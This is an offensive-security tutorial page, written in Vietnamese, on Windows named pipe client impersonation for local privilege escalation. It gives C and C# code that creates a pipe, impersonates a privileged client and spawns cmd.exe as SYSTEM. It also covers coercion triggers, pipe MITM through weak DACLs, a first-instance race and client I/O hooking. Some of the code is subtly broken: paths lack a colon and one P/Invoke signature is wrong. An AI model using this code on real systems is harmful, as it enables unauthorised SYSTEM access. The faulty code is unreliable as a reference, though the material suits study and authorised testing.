# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation là một primitive leo thang đặc quyền cục bộ, cho phép thread của named-pipe server áp dụng ngữ cảnh bảo mật của client kết nối với nó. Trên thực tế, kẻ tấn công có thể chạy code với SeImpersonatePrivilege sẽ buộc một client đặc quyền (ví dụ: dịch vụ SYSTEM) kết nối đến pipe do kẻ tấn công kiểm soát, gọi ImpersonateNamedPipeClient, sao chép token thu được thành primary token, rồi khởi chạy tiến trình dưới danh nghĩa client (thường là NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Trang này tập trung vào kỹ thuật cốt lõi. Để xem các exploit chain từ đầu đến cuối nhằm buộc SYSTEM kết nối đến pipe của bạn, hãy xem các trang về họ Potato được tham chiếu bên dưới.

## TL;DR
- Tạo một named pipe: \\.\pipe\<random> và chờ kết nối.
- Khiến một thành phần đặc quyền kết nối đến pipe đó (spooler/DCOM/EFSRPC, v.v.).
- Đọc ít nhất một message từ pipe, sau đó gọi ImpersonateNamedPipeClient.
- Mở impersonation token từ thread hiện tại, gọi DuplicateTokenEx(TokenPrimary), rồi dùng CreateProcessWithTokenW/CreateProcessAsUser để có được một tiến trình SYSTEM.<sup>[[2]](#references)</sup>

## Các yêu cầu và API chính
- Các đặc quyền thường cần thiết cho tiến trình/thread gọi:
  - SeImpersonatePrivilege để impersonate thành công client kết nối và sử dụng CreateProcessWithTokenW.
  - Ngoài ra, sau khi impersonate SYSTEM, bạn có thể dùng CreateProcessAsUser; thao tác này có thể yêu cầu SeAssignPrimaryTokenPrivilege và SeIncreaseQuotaPrivilege (được đáp ứng khi bạn đang impersonate SYSTEM).
- Các API cốt lõi được sử dụng:<sup>[[1]](#references)[[4]](#references)</sup>
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (phải đọc ít nhất một message trước khi impersonation)
  - ImpersonateNamedPipeClient và RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW hoặc CreateProcessAsUser
- Mức impersonation: để thực hiện các thao tác hữu ích trên máy cục bộ, client phải cho phép SecurityImpersonation (mặc định đối với nhiều client RPC/named-pipe cục bộ). Client có thể hạ mức này bằng SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION khi mở pipe.<sup>[[3]](#references)</sup>

## Quy trình Win32 tối thiểu (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
    LPCSTR pipe = "\\\\.\\pipe\\evil";
    HANDLE hPipe = CreateNamedPipeA(
        pipe,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 0, 0, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) return 1;

    // Wait for privileged client to connect (see Triggers section)
    if (!ConnectNamedPipe(hPipe, NULL)) return 2;

    // Read at least one message before impersonation
    char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

    // Impersonate the last message sender
    if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

    // Extract and duplicate the impersonation token into a primary token
    HANDLE impTok = NULL, priTok = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
    if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

    // Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
    STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
    if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
                                 L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                                 0, NULL, NULL, &si, &pi)) {
        // Fallback: CreateProcessAsUser after you already impersonated SYSTEM
        CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                             NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }

    RevertToSelf(); // Restore original context
    return 0;
}
```
Ghi chú:
- Nếu ImpersonateNamedPipeClient trả về ERROR_CANNOT_IMPERSONATE (1368), hãy đảm bảo bạn đọc dữ liệu từ pipe trước và client không giới hạn mức mạo danh ở mức Identification.
- Ưu tiên dùng DuplicateTokenEx với SecurityImpersonation và TokenPrimary để tạo primary token phù hợp cho việc tạo tiến trình.

## Ví dụ nhanh về .NET
Trong .NET, NamedPipeServerStream có thể mạo danh thông qua RunAsClient. Sau khi mạo danh, hãy sao chép thread token và tạo tiến trình.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
  [DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
  [DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
  [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
  static void Main(){
    using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
    s.WaitForConnection();
    // Ensure client sent something so the token is available
    s.RunAsClient(() => {
      IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
      IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
      var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
      Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
    });
  }
}
```

## Các trigger/coercion phổ biến để đưa SYSTEM vào pipe của bạn
Các kỹ thuật này buộc những service có đặc quyền kết nối đến named pipe của bạn để bạn có thể impersonate chúng:
- Trigger Print Spooler RPC (PrintSpoofer)
- Các biến thể kích hoạt DCOM/NTLM reflection (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Xem hướng dẫn sử dụng chi tiết và khả năng tương thích tại đây:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Nếu bạn chỉ cần ví dụ đầy đủ về cách tạo pipe và impersonate để spawn SYSTEM từ một service trigger, hãy xem:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Lạm dụng Named Pipe IPC & MITM (ACL, race First-Instance, hook client)

Khi một service có đặc quyền và một process có ít đặc quyền giao tiếp qua `\\.\pipe\...`, hãy xem pipe như mọi ranh giới IPC không đáng tin cậy khác. Ngoài kỹ thuật impersonation phía server kinh điển, ACL pipe yếu, cờ khởi tạo không an toàn và các quyết định tin cậy phía client đều có thể trở thành primitive leo thang đặc quyền cục bộ.<sup>[[7]](#references)</sup>

### Trước tiên, liệt kê các pipe tiềm năng
- Liệt kê nhanh các pipe từ PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` hữu ích để phát hiện số lượng instance và các pipe chỉ có một instance.
- Ưu tiên các tên được dùng bởi service chạy dưới quyền `SYSTEM`, đặc biệt là helper, updater, launcher và UI broker.

### MITM qua DACL quá dễ dãi và các pipe instance bổ sung
- Bất kỳ process nào có thể giao tiếp với server có đặc quyền đều có thể fuzz protocol và tìm các privileged verb.<sup>[[7]](#references)</sup>
- Trường hợp đáng chú ý hơn là khi DACL cấp quyền `FILE_GENERIC_WRITE`/`GENERIC_WRITE` trên đối tượng pipe. Với named pipe, quyền này ngầm bao gồm `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` dùng chung bit này), do đó attacker có thể tạo một server instance khác cùng tên.
- Vì các instance được ghép theo thứ tự FIFO, instance do attacker tạo và instance hợp lệ có thể đan xen: tạo một instance giả bằng `CreateNamedPipe`, sau đó mở cùng tên pipe bằng `CreateFile` và chờ client thật kết nối vào instance server giả.
- Kết quả: quan sát, sửa đổi, relay hoặc làm mất đồng bộ IPC có đặc quyền mà không cần chiếm quyền sở hữu process server ban đầu.

### Race first-instance trên security descriptor của pipe
- `lpSecurityAttributes` chỉ định nghĩa DACL khi instance đầu tiên của một tên pipe được tạo.<sup>[[4]](#references)[[7]](#references)</sup>
- Nếu một service có đặc quyền khởi động trễ và không dùng `FILE_FLAG_FIRST_PIPE_INSTANCE`, attacker có thể tạo trước tên pipe với DACL dễ dãi, rồi để service tạo các instance sau trong security context do attacker chọn.
- Điều này biến quá trình khởi động service thành một race condition: thắng ở instance đầu tiên, sau đó kết nối hoặc MITM các client tiếp theo bằng ACL đã bị làm yếu.
- Biện pháp giảm thiểu dành cho defender, đồng thời là điểm cần kiểm tra quan trọng với attacker: xem `CreateNamedPipe(..., dwOpenMode, ...)` có bao gồm `FILE_FLAG_FIRST_PIPE_INSTANCE` hay không. Nếu không, hãy thử tạo pipe trước khi service khởi động.

### Kiểm tra PID/chữ ký là biện pháp hardening, không phải ranh giới bảo mật
- Một số sản phẩm cố gắng hạn chế quyền truy cập bằng cách kiểm tra `GetNamedPipeClientProcessId`, đường dẫn image của process hoặc Authenticode signer của client kết nối.<sup>[[7]](#references)</sup>
- Biện pháp này chỉ có tác dụng cho đến khi bạn inject vào client hợp lệ: khi đã ở bên trong process đáng tin cậy, bạn kế thừa chính xác PID/image/signature context mà server mong đợi.
- Với các desktop app chia tách, instrument process UI/helper có ít đặc quyền thường dễ hơn là tấn công trực tiếp service `SYSTEM`.

### Hook client theo mô hình I/O của nó
- I/O đồng bộ: intercept `NtWriteFile` trước khi syscall sử dụng buffer, và kiểm tra/chỉnh sửa `NtReadFile` sau khi hàm trả về.<sup>[[7]](#references)</sup>
- I/O Overlapped: lưu `OVERLAPPED`/`IoStatusBlock` được thấy trong `NtReadFile`, sau đó kiểm tra buffer khi `GetOverlappedResult` hoặc lần chờ liên quan hoàn tất.
- Completion ports: `GetQueuedCompletionStatus` đi đến `NtRemoveIoCompletion`; `ApcContext` được trả về liên kết với `OVERLAPPED` dùng trong lần đọc ban đầu, đây là điểm thích hợp để tìm buffer hiện đã được điền dữ liệu.
- Completion routine (`ReadFileEx`): callback hoàn tất được gửi dưới dạng APC. Nếu muốn can thiệp dữ liệu trả về hoặc inject phản hồi giả, hãy hook completion routine thật và, để inject tùy chỉnh, dùng dispatcher `QueueUserAPC` nhận một đối số để dựng lại 3 đối số mà routine mong đợi.<sup>[[5]](#references)[[7]](#references)</sup>

### Ghi chú về công cụ
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxy lưu lượng named pipe qua một helper DLL được inject và cung cấp workflow chỉnh sửa/replay tương tự Burp.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) dùng cách tiếp cận dựa trên Frida, tập trung hook `NtReadFile`/`NtWriteFile` cùng các điểm pivot async/completion ở trên, rồi chuyển tiếp lưu lượng đến workflow chỉnh sửa dựa trên WebSocket.<sup>[[7]](#references)[[8]](#references)</sup>

```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```

### Các lưu ý khi vận hành
- Named pipe có độ trễ thấp; tạm dừng lâu khi chỉnh sửa buffer có thể khiến các service dễ bị lỗi rơi vào deadlock.<sup>[[7]](#references)</sup>
- Client dùng Overlapped/completion-port/APC cần hook khác với các detour `ReadFile`/`WriteFile` đơn giản.
- Inject vào client đáng tin cậy khá dễ gây chú ý và thường chỉ nên dùng khi phát triển exploit, reverse protocol hoặc fuzzing trong lab cục bộ.

## Khắc phục sự cố và những điểm cần lưu ý
- Bạn phải đọc ít nhất một message từ pipe trước khi gọi ImpersonateNamedPipeClient; nếu không, bạn sẽ nhận ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Nếu client kết nối bằng SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server không thể impersonate hoàn toàn; hãy kiểm tra mức impersonation của token bằng GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW yêu cầu caller có SeImpersonatePrivilege. Nếu lệnh này thất bại với ERROR_PRIVILEGE_NOT_HELD (1314), hãy dùng CreateProcessAsUser sau khi đã impersonate SYSTEM.
- Nếu bạn harden pipe, hãy đảm bảo security descriptor của pipe cho phép target service kết nối; theo mặc định, quyền truy cập vào pipe trong \\.\pipe được xác định theo DACL của server.<sup>[[3]](#references)</sup>

## References

- [1] [Windows: Tài liệu về ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Leo thang đặc quyền qua named pipe trên Windows](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Bảo mật Named Pipe và quyền truy cập](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: Hàm CreateNamedPipe](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server sử dụng Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – công cụ proxy named pipe trên Windows](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Named Pipe trên Windows](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)
{{#include ../../banners/hacktricks-training.md}}
